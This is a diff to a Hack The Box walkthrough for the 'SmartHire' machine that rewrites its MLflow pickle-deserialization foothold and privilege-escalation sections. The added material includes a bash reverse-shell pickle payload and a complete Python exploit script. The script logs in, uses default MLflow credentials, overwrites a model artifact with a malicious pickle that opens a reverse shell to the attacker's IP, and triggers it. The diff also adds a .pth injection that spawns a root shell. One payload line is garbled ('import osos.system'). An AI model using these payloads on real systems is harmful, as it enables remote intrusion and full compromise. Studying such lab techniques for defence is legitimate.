@@ -157,27 +157,7 @@ This immediately suggested investigating how the application loaded the model.
 
 ## 6. Python Version Enumeration
 
-After obtaining the foothold, I enumerated the environment:
-
-```bash
-python3 --version
-```
-
-The machine was running:
-
-```
-Python 3.10
-```
-
-This was important for building the malicious pickle.
-
-Rather than using the system Python environment on my Kali machine, I used `uv` to execute the payload with **Python 3.10** and provide the required `requests` dependency:
-
-```bash
-uv run --with requests --python 3.10 payload.py
-```
-
-This gives us a controlled Python 3.10 environment for generating the payload.
+I enumerated the environment and got to know that foothold has py version 3.10
 
 ***
 
@@ -207,27 +187,14 @@ This gives us a code-execution primitive.
 I created the following payload:
 
 ```python
-import pickle, os, requests
+import pickle, os
 
 class Payload:
     def __reduce__(self):
-        return requests.get, ("http://10.10.14.171:9001",)
+        return os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.14.171/9001 0>&1'",)
 
-with open("payload.pkl", "wb") as f:
+with open("payload1.pkl", "wb") as f:
     pickle.dump(Payload(), f)
-```
-
-The important portion is:
-
-```python
-def __reduce__(self):
-    return requests.get, ("http://10.10.14.171:9001",)
-```
-
-During deserialization, Python reconstructs the object by invoking:
-
-```python
-requests.get("http://10.10.14.171:9001")
 ```
 
 The resulting execution flow is:
@@ -239,7 +206,7 @@ pickle.load()
      ↓
 Payload.__reduce__()
      ↓
-requests.get()
+os.system
      ↓
 10.10.14.171:9001
 ```
@@ -321,6 +288,172 @@ svcweb
 
 ***
 
+if this doesnt work then you can use:
+
+```bash
+#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════╗
+║       SmartHire - MLflow Pickle Deserialization RCE  ║
+║                                                      ║
+║       Author  : maverick-vf142                       ║
+║       HTB     : SmartHire                            ║
+║       CVE     : Pickle Deserialization via MLflow    ║
+╚══════════════════════════════════════════════════════╝
+
+Usage: python3 exploit.py <LHOST> <LPORT> [--target <URL>] [--mlflow <URL>]
+
+All credentials and targets are prompted or passed as args — nothing hardcoded.
+"""
+
+import pickle
+import os
+import sys
+import argparse
+import getpass
+import requests
+
+# ── Argument parsing ──────────────────────────────────────────────────────────
+parser = argparse.ArgumentParser(description="SmartHire MLflow RCE")
+parser.add_argument("lhost",   help="Your listener IP")
+parser.add_argument("lport",   help="Your listener port")
+parser.add_argument("--target", default="http://smarthire.htb",        help="Target app URL")
+parser.add_argument("--mlflow", default="http://models.smarthire.htb", help="MLflow URL")
+args = parser.parse_args()
+
+LHOST  = args.lhost
+LPORT  = args.lport
+TARGET = args.target.rstrip("/")
+MLFLOW = args.mlflow.rstrip("/")
+
+TRAIN_CSV = b"name,skills,experience,education,position_applied,previous_company\nAlice,Python,48,Masters,Eng,Corp\nBob,Java,72,Bachelors,Dev,Inc\n"
+PRED_CSV  = b"name,skills,experience,education,position_applied,previous_company\nTest,Python,24,Bachelors,Eng,Co\n"
+
+print("╔══════════════════════════════════════════════════════╗")
+print("║     SmartHire - MLflow Pickle Deserialization RCE    ║")
+print("║                  by maverick-vf142                   ║")
+print("╚══════════════════════════════════════════════════════╝")
+print(f"[*] Target  : {TARGET}")
+print(f"[*] MLflow  : {MLFLOW}")
+print(f"[*] Listener: {LHOST}:{LPORT}")
+print()
+
+# ── App credentials ───────────────────────────────────────────────────────────
+print("[*] App credentials (needs upload/admin role):")
+app_user = input("    Username : ")
+app_pass = getpass.getpass("    Password : ")
+
+# ── MLflow credentials ────────────────────────────────────────────────────────
+print("\n[*] MLflow credentials (press Enter to use defaults admin/password):")
+ml_user  = input("    MLflow username [admin]   : ").strip() or "admin"
+ml_pass  = getpass.getpass("    MLflow password [password]: ") or "password"
+MLCREDS  = (ml_user, ml_pass)
+print()
+
+# ── Pickle payload ────────────────────────────────────────────────────────────
+class ReverseShell:
+    def __reduce__(self):
+        cmd = (
+            f"python3 -c '"
+            f"import socket,subprocess,os;"
+            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+            f"s.connect((\"{LHOST}\",{LPORT}));"
+            f"os.dup2(s.fileno(),0);"
+            f"os.dup2(s.fileno(),1);"
+            f"os.dup2(s.fileno(),2);"
+            f"subprocess.call([\"/bin/bash\",\"-i\"])'"
+        )
+        return (os.system, (cmd,))
+
+payload = pickle.dumps(ReverseShell())
+print(f"[+] Pickle payload built ({len(payload)} bytes)")
+
+# ── Login ─────────────────────────────────────────────────────────────────────
+print(f"[*] Logging in as '{app_user}'...")
+sess = requests.Session()
+r = sess.post(f"{TARGET}/login",
+              data={"username": app_user, "password": app_pass},
+              allow_redirects=True)
+
+if "dashboard" not in r.url:
+    print(f"[!] Login failed — landed at: {r.url}")
+    print(f"    HTTP {r.status_code} | Check credentials or --target")
+    sys.exit(1)
+print(f"[+] Login OK — session active")
+
+# ── Upload training CSV ───────────────────────────────────────────────────────
+print("[*] Uploading training CSV to register a new MLflow model version...")
+r = sess.post(f"{TARGET}/upload_hiring_data",
+              files={"file": ("train.csv", TRAIN_CSV, "text/csv")})
+
+if "login" in r.url:
+    print("[!] Redirected to login — this account lacks upload/admin permissions")
+    sys.exit(1)
+
+if r.status_code != 200:
+    print(f"[!] Upload failed: HTTP {r.status_code} | {r.text[:300]}")
+    sys.exit(1)
+
+try:
+    version = r.json().get("model_info", {}).get("version", "?")
+except requests.exceptions.JSONDecodeError:
+    print(f"[!] Non-JSON response from /upload_hiring_data:")
+    print(f"    {r.text[:400]}")
+    sys.exit(1)
+
+print(f"[+] Registered model version: {version}")
+
+# ── Grab latest run_id from MLflow ────────────────────────────────────────────
+print("[*] Fetching latest run_id from MLflow API...")
+r = requests.post(
+    f"{MLFLOW}/api/2.0/mlflow/runs/search",
+    json={"experiment_ids": ["0"], "max_results": 1},
+    auth=MLCREDS
+)
+
+if r.status_code == 401:
+    print("[!] MLflow auth failed — wrong MLflow credentials")
+    sys.exit(1)
+
+try:
+    run_id = r.json()["runs"][0]["info"]["run_id"]
+except (KeyError, IndexError):
+    print(f"[!] Could not parse run_id:\n    {r.text[:300]}")
+    sys.exit(1)
+
+print(f"[+] run_id: {run_id}")
+
+# ── Overwrite python_model.pkl ────────────────────────────────────────────────
+print("[*] Replacing python_model.pkl with malicious pickle...")
+artifact_url = (
+    f"{MLFLOW}/api/2.0/mlflow-artifacts/artifacts"
+    f"/0/{run_id}/artifacts/model/python_model.pkl"
+)
+r = requests.put(artifact_url, data=payload, auth=MLCREDS,
+                 headers={"Content-Type": "application/octet-stream"})
+
+if r.status_code != 200:
+    print(f"[!] Artifact upload failed: HTTP {r.status_code} | {r.text[:300]}")
+    sys.exit(1)
+
+print(f"[+] Malicious pickle uploaded successfully")
+
+# ── Trigger /predict → executes pickle → reverse shell ───────────────────────
+print(f"\n[!] Start your listener now:  nc -lvnp {LPORT}")
+input("[*] Press Enter when your listener is ready...")
+
+print(f"[*] Triggering /predict ...")
+try:
+    sess.post(f"{TARGET}/predict",
+              files={"file": ("pred.csv", PRED_CSV, "text/csv")},
+              timeout=20)
+except requests.exceptions.Timeout:
+    pass  # expected — shell holds the connection open
+
+print("[+] Done — check your listener for a shell.")
+print("    If nothing arrived, the box may block outbound TCP.")
+```
+
 ## 12. Foothold Enumeration
 
 Once inside the machine, I started enumerating the environment:
@@ -350,238 +483,99 @@ This confirmed the Python runtime that was relevant to the exploitation chain.
 
 ## 13. Privilege Escalation Enumeration
 
-I checked the available sudo privileges:
+### Privilege Escalation
 
-```bash
+With the foothold as `svcweb`, I started looking for a way to escalate privileges.
+
+First, I checked the available sudo permissions:
+
+```
 sudo -l
 ```
 
-This revealed a privileged Python management script.
+This revealed that I could execute the MLflow management script as `root`.
 
-The script was:
-
-```
-/opt/tools/mlflow_ctl/mlflowctl.py
-```
-
-and could be executed with elevated privileges.
-
-I then inspected the script to understand how it handled Python modules and plugins.
-
-***
-
-## 14. Python Plugin Loading
-
-The privileged script interacted with a Python plugin directory.
-
-The interesting behavior involved adding a directory to Python's module search path.
-
-This meant that files placed in the plugin directory could influence the behavior of the Python process.
-
-The directory was writable by a group that the compromised user belonged to.
-
-This gave us a path from:
+I inspected the script:
 
 ```
-svcweb
+cat /opt/tools/mlflow_ctl/mlflowctl.py
 ```
 
-to:
+The script uses Python's `site.addsitedir()` to load the development plugin directory:
 
 ```
-root
+/opt/tools/mlflow_ctl/plugins/dev/
 ```
 
-through Python's import/startup mechanisms.
+The important detail is that this directory is **writable by `svcweb`**.
 
-***
+#### Abusing `.pth` Files
 
-## 15. `.pth` File Abuse
+Python automatically processes `.pth` files when `site.addsitedir()` is called. A `.pth` file containing an `import` statement can therefore execute Python code.
 
-Python processes `.pth` files when initializing site-package directories.
-
-A `.pth` file can contain an import statement such as:
+Since `svcweb` can write to the plugin directory, I created a malicious `.pth` file:
 
 ```
-import malicious
+echo 'import os; os.system("/bin/bash -p")' > /opt/tools/mlflow_ctl/plugins/dev/evil.pth
 ```
 
-If Python processes a writable directory containing such a file, the imported module can execute code.
-
-Therefore, I created a malicious Python module and corresponding `.pth` file in the writable plugin directory.
-
-Conceptually:
+The payload:
 
 ```
-Writable plugin directory
-        ↓
-malicious .pth
-        ↓
-Python processes .pth
-        ↓
-malicious module imported
-        ↓
-code executes as root
+import osos.system("/bin/bash -p")
 ```
 
-The critical condition was that the vulnerable Python management script was executed with root privileges.
+launches a privileged Bash shell.
 
-***
+I then triggered the vulnerable script through the sudo permission:
 
-## 16. Root
+```
+sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
+```
 
-After triggering the privileged Python process:
+Because the script runs as `root` and calls `site.addsitedir()` on the writable plugin directory, Python processes `evil.pth` and executes the embedded import.
 
-```bash
+This gives a root shell.
+
+I verified the privilege escalation with:
+
+```
 whoami
 ```
 
-returned:
+which returned:
 
 ```
 root
 ```
 
-The machine was therefore fully compromised.
-
-***
-
-## Attack Chain
-
-The complete attack chain can be summarized as:
+Finally, I retrieved the root flag:
 
 ```
-Port Scan
-   ↓
-smarthire.htb
-   ↓
-Virtual Host Enumeration
-   ↓
-models.smarthire.htb
-   ↓
-MLflow
-   ↓
-admin:password
-   ↓
-MLflow Artifact API
-   ↓
-python_model.pkl
-   ↓
-Python Pickle Deserialization
-   ↓
-Malicious __reduce__()
-   ↓
-Code Execution
-   ↓
-svcweb
-   ↓
-Python 3.10 Enumeration
-   ↓
-Privileged mlflowctl.py
-   ↓
-Writable Python Plugin Directory
-   ↓
-.pth File
-   ↓
-Python Import Execution
-   ↓
-root
+cat /root/root.txt
 ```
 
-***
-
-## Key Takeaways
-
-#### 1. MLflow is part of the attack surface
-
-Machine-learning infrastructure should not be treated as inherently trusted.
-
-MLflow artifacts can contain executable Python objects, especially when models use Python serialization mechanisms.
-
-#### 2. Pickle is unsafe for untrusted data
-
-The critical primitive was:
-
-```python
-def __reduce__(self):
-    return requests.get, ("http://10.10.14.171:9001",)
-```
-
-Deserializing an attacker-controlled pickle can result in arbitrary function execution.
-
-#### 3. Match the target Python environment
-
-Enumeration showed that the relevant environment used:
-
-```
-Python 3.10
-```
-
-I therefore generated the payload using:
-
-```bash
-uv run --with requests --python 3.10 payload.py
-```
-
-Using `uv` made it possible to explicitly reproduce the target Python version while providing the `requests` dependency.
-
-#### 4. Writable Python plugin directories are dangerous
-
-A directory writable by an unprivileged user becomes particularly dangerous when it is later loaded by a Python process running as root.
-
-#### 5. `.pth` files can provide code execution
-
-Python `.pth` files can execute imports during interpreter initialization, making writable Python search paths a useful privilege-escalation primitive.
-
-***
-
-## Tools Used
-
-| Tool          | Purpose                              |
-| ------------- | ------------------------------------ |
-| `nmap`        | Port/service enumeration             |
-| `ffuf`        | Virtual-host enumeration             |
-| `curl`        | HTTP and MLflow API interaction      |
-| `uv`          | Python 3.10 execution/environment    |
-| `pickle`      | Python serialization/deserialization |
-| `requests`    | HTTP callback primitive              |
-| `sudo`        | Privilege escalation enumeration     |
-| Python `.pth` | Startup/import execution             |
-
-***
-
-## Conclusion
-
-SmartHire demonstrates an attack chain where an exposed machine-learning infrastructure becomes the initial entry point.
-
-The most interesting part of the box is the transition from an MLflow model artifact to code execution:
-
-```
-MLflow
-  ↓
-Model Artifact
-  ↓
-Python Pickle
-  ↓
-Unsafe Deserialization
-  ↓
-Code Execution
-```
-
-The privilege escalation then abuses the Python runtime itself:
+#### Privilege Escalation Chain
 
 ```
 svcweb
-  ↓
-Privileged Python Script
-  ↓
-Writable Plugin Directory
-  ↓
-.pth File
-  ↓
-Python Import
-  ↓
+   ↓
+sudo -l
+   ↓
+mlflowctl.py executable as root
+   ↓
+site.addsitedir()
+   ↓
+/opt/tools/mlflow_ctl/plugins/dev/
+   ↓
+Writable by svcweb
+   ↓
+evil.pth
+   ↓
+Python executes import
+   ↓
+/bin/bash -p
+   ↓
 root
 ```
 
-The box highlights an important security principle: **machine-learning infrastructure, model artifacts, and Python runtime configuration all need to be treated as security-sensitive components.**
